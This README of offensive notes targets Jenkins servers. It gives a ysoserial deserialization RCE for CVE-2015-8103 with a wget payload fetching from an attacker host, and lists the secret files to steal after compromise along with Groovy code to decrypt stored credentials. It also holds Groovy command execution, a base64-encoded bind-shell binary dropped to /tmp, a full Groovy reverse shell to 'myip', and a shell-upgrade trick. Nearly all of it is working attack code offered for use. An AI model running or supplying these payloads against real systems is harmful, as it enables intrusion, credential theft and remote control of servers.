pwn_jenkins
===========

Notes about Jenkins exploitation and post-exploitation.


RCE in old Jenkins (CVE-2015-8103, Jenkins 1.638 and older)
==========================================================

Use ysoserial to generate a payload:
https://github.com/frohoff/ysoserial

Then RCE using this script or the one joined (./rce/pwn_jenkins.py):
https://github.com/foxglovesec/JavaUnserializeExploits/blob/master/jenkins.py

```bash
java -jar ysoserial-master.jar CommonsCollections1 'wget myip:myport -O /tmp/a.sh' > payload.out
./jenkins_rce.py jenkins_ip jenkins_port payload.out
```


Files to copy after compromission
=================================

These files are needed to decrypt Jenkins secrets:

* secrets/master.key
* secrets/hudson.util.Secret

Such secrets can usually be found in:

* credentials.xml

Decrypt Jenkins secrets offline
===============================

See ./offline_decryption/jenkins_offline_decrypt.py


Decrypt Jenkins secrets from Groovy
===================================

```java
println(hudson.util.Secret.decrypt("{...}"))
```


Command execution from Groovy
=============================

```java
def proc = "id".execute();
def os = new StringBuffer();
proc.waitForProcessOutput(os, System.err);
println(os.toString());
```

For multiline shell commands, use the following shell syntax trick (example includes bind shell):

```java
def proc="sh -c \$@|sh . echo /bin/echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAABAAAAAAAAAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAzgAAAAAAAAAkAQAAAAAAAAAQAAAAAAAAailYmWoCX2oBXg8FSJdSxwQkAgD96UiJ5moQWmoxWA8FajJYDwVIMfZqK1gPBUiXagNeSP/OaiFYDwV19mo7WJlIuy9iaW4vc2gAU0iJ51JXSInmDwU= | base64 -d > /tmp/65001".execute();
```

Reverse shell from Groovy
=========================

```java
String host="myip";
int port=1234;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

I'll leave this reverse shell tip here in case anyone needs it:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
^Z bg
stty -a
echo $TERM
stty raw -echo
fg
export TERM=...
stty rows xx columns yy
```
